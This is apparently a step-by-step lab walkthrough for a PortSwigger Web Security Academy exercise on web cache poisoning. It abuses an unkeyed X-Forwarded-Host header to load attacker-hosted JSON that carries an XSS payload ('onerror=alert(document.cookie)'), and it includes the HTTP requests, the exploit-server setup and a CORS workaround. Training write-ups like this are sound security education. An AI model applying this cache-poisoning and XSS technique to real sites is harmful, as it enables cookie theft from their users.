# [Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria)

- open the lab in burp browser
- send the `/` request to the repeater
- check if it is a cache oracle (it is not)
- the response have a session cookie and the cache server dont want to store that
- that is the reason why it is not a cache server
- copy the session cookie to the request

```
GET / HTTP/2
Host: xxx.web-security-academy.net
Cookie: session=xyz
...
```

- no it is a cache oracle
- check for a cachebuster

```
GET /?qwe=asd HTTP/2
Host: xxx.web-security-academy.net
Cookie: xyz
```

- start a Param Miner (extension) on the request to check what headers might be unkeyed
- `Extensions` -> `Param Miner` -> `Guess headers`
- it will find the `x-forwarded-host`
- try it

```
GET /?qwe=asd HTTP/2
Host: 0a4f00e403c513a180c82169003c0057.web-security-academy.net
Cookie: session=cdw6qDI6eCGpb49UGVkfOHaoUiUWN0v2
X-Forwarded-Host: example.com
...
```

- look up in the response if there are any `example.com` mentioned

```html
<script>
  data = { host: "example.com", path: "/" };
</script>
```

- lets check if the data is used somewhere

```html
<script>
  initGeoLocate("//" + data.host + "/resources/json/geolocate.json");
</script>
```

- lets check if the `initGeoLocate` or the `/resources/json/geolocate.json` is available in the **Target** -> **site map**

> the `/resources/js/geolocate.js` response:

```
HTTP/2 200 OK
...
function initGeoLocate(jsonUrl)
{
    fetch(jsonUrl)
        .then(r => r.json())
        .then(j => {
            let geoLocateContent = document.getElementById('shipping-info');

            let img = document.createElement("img");
            img.setAttribute("src", "/resources/images/localShipping.svg");
            geoLocateContent.appendChild(img)

            let div = document.createElement("div");
            div.innerHTML = 'Free shipping to ' + j.country;
            geoLocateContent.appendChild(div)
        });
}
```

- the `div.innerHTML = 'Free shipping to ' + j.country;` could be dangerous

> the `/resources/json/geolocate.json` response:

```
HTTP/2 200 OK
...
{
    "country": "United Kingdom"
}
```

- so if the `"country"` could be hijacked then it could inject (sink) exploit in the html code

> exploit

- copy the exploit server url to the `X-Forwarded-Host`

```
GET /?qwe=asd HTTP/2
Host: xxx.web-security-academy.net
Cookie: session=xyz
X-Forwarded-Host: exploit-yyy.exploit-server.net
```

- in the exploit server for file path add the json path `/resources/json/geolocate.json`
- change the exploit head to `json`

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
```

- for the body add the exploit

```
{
    "country": "<img src=1 onerror=alert(document.cookie) />"
}
```

- send the request to cache it
- if you try it in the browser with the cachebuster: `https://xxx.web-security-academy.net/?qwe=asda`
- it will do nothing because the cross blocks the `geolocate.json` from other host
- add the `Access-Control-Allow-Origin: *` to the exploit server head

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Access-Control-Allow-Origin: *
```

- because the `/resources/json/geolocate.json` set to `cors`

```
GET /resources/json/geolocate.json HTTP/2
...
Sec-Fetch-Mode: cors
...
```

- try the exploit again with the cachebuster
- it should work this time
- send the request without the cachebuster
- send it a couple times to make sure that the bot dont click between two caches
